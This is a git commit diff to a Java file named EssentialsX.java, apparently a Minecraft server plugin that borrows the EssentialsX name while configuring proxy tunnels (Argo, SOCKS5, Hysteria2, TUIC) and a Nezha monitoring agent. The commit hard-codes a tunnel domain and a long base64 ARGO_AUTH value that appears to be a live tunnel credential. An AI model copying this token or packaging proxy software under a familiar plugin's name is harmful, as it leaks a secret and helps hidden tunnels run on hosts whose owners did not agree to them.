c3412d54bf9ba7d777a2cbf65589a29179627f99
shanjiang66 <115859724+shanjiang66@users.noreply.github.com>
2026-06-07 06:31:01 +0800

    Update EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -79,8 +79,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
+        env.put("ARGO_DOMAIN", "dee.myusdt.eu.cc");
+        env.put("ARGO_AUTH", "eyJhIjoiNTkwM2E3NjFiZWU3NDlhYTRjNDIwNTdhODJmYmViNzYiLCJ0IjoiZjcyYzY0YjUtZTZhMC00ZWQyLTk5MzktMDg4NGRkNGE0NDM0IiwicyI6IlpUbGlNRE5pWm1RdFlUZzVNaTAwTURWaUxUZzBOV1V0WldabU1qQTBaV1V5TWpNMyJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
